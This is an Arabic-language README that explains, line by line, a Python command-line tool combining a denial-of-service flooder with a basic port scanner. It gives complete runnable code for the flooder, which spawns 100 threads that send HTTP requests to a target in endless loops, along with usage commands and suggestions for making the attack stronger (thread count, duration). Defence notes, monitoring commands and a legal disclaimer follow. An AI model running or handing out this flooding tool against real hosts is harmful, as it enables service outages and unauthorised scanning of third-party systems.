# 🛠️ أداة CLI متعددة الوظائف - cli.py

## 📋 نظرة عامة

هذا الملف يقدم أداة سطر أوامر متعددة الوظائف تجمع بين هجوم DoS وفحص البورتات. الأداة مصممة لتكون أكثر احترافية من الأدوات البسيطة الأخرى.

## 🔍 شرح مفصل للكود

### 📦 الاستيرادات
```python
#!/usr/bin/env python3

import argparse
import socket
import threading
```

**شرح كل سطر:**
- **#!/usr/bin/env python3**: shebang لتحديد مفسر Python
- **argparse**: لمعالجة وسيطات سطر الأوامر
- **socket**: للاتصالات الشبكية
- **threading**: لإنشاء خيوط متعددة

### ⚔️ دالة هجوم DoS
```python
def run_dos(target, port):
    def attack():
        while True:
            try:
                s = socket.socket()
                s.connect((target, port))
                s.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
                s.close()
                print(f"[DoS] Sent to {target}:{port}")
            except:
                pass

    for _ in range(100):
        t = threading.Thread(target=attack)
        t.start()
```

**شرح كل سطر:**
- **def run_dos(target, port)**: تعريف دالة DoS الرئيسية
- **def attack()**: دالة داخلية للهجوم الفردي
- **while True**: حلقة لا نهائية للهجوم المستمر
- **try**: بداية معالجة الأخطاء
- **s = socket.socket()**: إنشاء socket جديد
- **s.connect((target, port))**: الاتصال بالهدف
- **s.send(b"...")**: إرسال طلب HTTP GET
- **s.close()**: إغلاق الاتصال
- **print(f"...")**: طباعة رسالة تأكيد مع f-string
- **except**: تجاهل الأخطاء
- **pass**: عدم فعل شيء في حالة الخطأ
- **for _ in range(100)**: إنشاء 100 خيط
- **t = threading.Thread(target=attack)**: إنشاء خيط جديد
- **t.start()**: بدء تشغيل الخيط

### 🔍 دالة فحص البورتات
```python
def run_scan(target):
    ports = [21, 22, 23, 80, 443, 3306]
    print(f"[Scan] Scanning {target}...")

    for port in ports:
        s = socket.socket()
        s.settimeout(1)
        try:
            s.connect((target, port))
            print(f"[Scan] Port {port} is open ✅")
            s.close()
        except:
            pass
```

**شرح كل سطر:**
- **def run_scan(target)**: تعريف دالة الفحص
- **ports = [...]**: قائمة البورتات المهمة للفحص
- **print(f"[Scan] Scanning {target}...")**: رسالة بدء الفحص
- **for port in ports**: التكرار على كل بورت
- **s = socket.socket()**: إنشاء socket جديد
- **s.settimeout(1)**: تعيين timeout ثانية واحدة
- **try**: بداية معالجة الأخطاء
- **s.connect((target, port))**: محاولة الاتصال
- **print(f"[Scan] Port {port} is open ✅")**: رسالة نجاح
- **s.close()**: إغلاق الاتصال
- **except**: تجاهل الأخطاء
- **pass**: عدم فعل شيء في حالة الخطأ

### 🎛️ دالة الرئيسية مع Argument Parser
```python
def main():
    parser = argparse.ArgumentParser(description="🧰 أداة CLI: DoS + Port Scan")
    parser.add_argument("target", help="عنوان IP أو دومين الهدف")
    parser.add_argument("--dos", action="store_true", help="تشغيل هجوم DoS")
    parser.add_argument("--scan", action="store_true", help="تشغيل فحص البورتات")
    parser.add_argument("--port", type=int, default=80, help="البورت المستهدف في هجوم DoS")

    args = parser.parse_args()

    if args.scan:
        run_scan(args.target)
    if args.dos:
        run_dos(args.target, args.port)
    if not args.scan and not args.dos:
        print("❌ اختر واحدة على الأقل: --scan أو --dos")
```

**شرح كل سطر:**
- **def main()**: الدالة الرئيسية
- **parser = argparse.ArgumentParser(...)**: إنشاء محلل الوسيطات
- **parser.add_argument("target", ...)**: إضافة وسيطة إجبارية للهدف
- **parser.add_argument("--dos", action="store_true", ...)**: إضافة خيار DoS
- **parser.add_argument("--scan", action="store_true", ...)**: إضافة خيار الفحص
- **parser.add_argument("--port", type=int, default=80, ...)**: إضافة خيار البورت
- **args = parser.parse_args()**: تحليل الوسيطات
- **if args.scan**: التحقق من اختيار الفحص
- **run_scan(args.target)**: تشغيل الفحص
- **if args.dos**: التحقق من اختيار DoS
- **run_dos(args.target, args.port)**: تشغيل DoS
- **if not args.scan and not args.dos**: التحقق من عدم اختيار أي شيء
- **print("❌ اختر واحدة على الأقل...")**: رسالة خطأ

### 🚀 نقطة الدخول
```python
if __name__ == "__main__":
    main()
```

**شرح كل سطر:**
- **if __name__ == "__main__"**: التحقق من تشغيل الملف مباشرة
- **main()**: استدعاء الدالة الرئيسية

## 🚀 كيفية التنفيذ

### 1. فحص البورتات
```bash
python3 cli.py 192.168.1.100 --scan
```

### 2. هجوم DoS
```bash
python3 cli.py 192.168.1.100 --dos --port 80
```

### 3. فحص بورت مخصص
```bash
python3 cli.py 192.168.1.100 --dos --port 443
```

### 4. عرض المساعدة
```bash
python3 cli.py --help
```

## ⚠️ الثغرات في الكود

### 1. عدم وجود تحقق من المدخلات
```python
# لا يتحقق من صحة عنوان IP أو الدومين
parser.add_argument("target", help="عنوان IP أو دومين الهدف")
```

### 2. معالجة أخطاء ضعيفة
```python
except:
    pass  # تجاهل جميع الأخطاء
```

### 3. عدم وجود حد للهجوم
الهجوم يستمر إلى ما لا نهاية

### 4. قائمة بورتات محدودة
```python
ports = [21, 22, 23, 80, 443, 3306]  # قائمة ثابتة
```

## 🛡️ طرق الحماية

### 1. Rate Limiting
```python
import time
from collections import defaultdict

class RateLimiter:
    def __init__(self, max_requests=100, window=60):
        self.max_requests = max_requests
        self.window = window
        self.requests = defaultdict(list)
    
    def is_allowed(self, ip):
        now = time.time()
        self.requests[ip] = [req for req in self.requests[ip] if now - req < self.window]
        
        if len(self.requests[ip]) >= self.max_requests:
            return False
        
        self.requests[ip].append(now)
        return True
```

### 2. Firewall Rules
```bash
# حظر IP مشبوه
iptables -A INPUT -s 192.168.1.100 -j DROP

# حظر البورتات غير المستخدمة
iptables -A INPUT -p tcp --dport 22 -j DROP
```

### 3. Intrusion Detection
```python
# مراقبة عدد الاتصالات
import logging

logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger(__name__)

def monitor_connections():
    # مراقبة الاتصالات النشطة
    pass
```

## 🔍 اكتشاف الهجمات

### 1. مراقبة السجلات
```bash
# مراقبة سجلات النظام
tail -f /var/log/syslog | grep "connection"

# مراقبة سجلات الويب
tail -f /var/log/apache2/access.log
```

### 2. مراقبة الشبكة
```bash
# مراقبة الاتصالات النشطة
netstat -an | grep ESTABLISHED

# مراقبة استخدام البورتات
lsof -i
```

### 3. أدوات المراقبة
- Wireshark
- tcpdump
- Snort
- Suricata

## 📊 تحسينات مقترحة

### 1. إضافة تحقق من المدخلات
```python
import re
import socket

def validate_target(target):
    # التحقق من صحة عنوان IP
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(ip_pattern, target):
        parts = target.split('.')
        return all(0 <= int(part) <= 255 for part in parts)
    
    # التحقق من صحة الدومين
    try:
        socket.gethostbyname(target)
        return True
    except socket.gaierror:
        return False
```

### 2. إضافة خيارات متقدمة
```python
parser.add_argument("--threads", type=int, default=100, help="عدد الخيوط")
parser.add_argument("--timeout", type=int, default=60, help="مدة الهجوم بالثواني")
parser.add_argument("--verbose", action="store_true", help="عرض تفاصيل أكثر")
```

### 3. تحسين معالجة الأخطاء
```python
def run_scan(target):
    ports = [21, 22, 23, 80, 443, 3306]
    print(f"[Scan] Scanning {target}...")
    
    open_ports = []
    
    for port in ports:
        try:
            s = socket.socket()
            s.settimeout(1)
            s.connect((target, port))
            print(f"[Scan] Port {port} is open ✅")
            open_ports.append(port)
            s.close()
        except socket.timeout:
            print(f"[Scan] Port {port} timeout")
        except ConnectionRefusedError:
            print(f"[Scan] Port {port} refused")
        except Exception as e:
            print(f"[Scan] Port {port} error: {e}")
    
    return open_ports
```

## ⚖️ الجوانب القانونية

- استخدام هذه الأداة ضد أنظمة أخرى غير قانوني
- استخدم فقط على أنظمة خاصة بك
- احصل على إذن مكتوب قبل الاختبار
- قد تؤدي إلى عواقب قانونية خطيرة 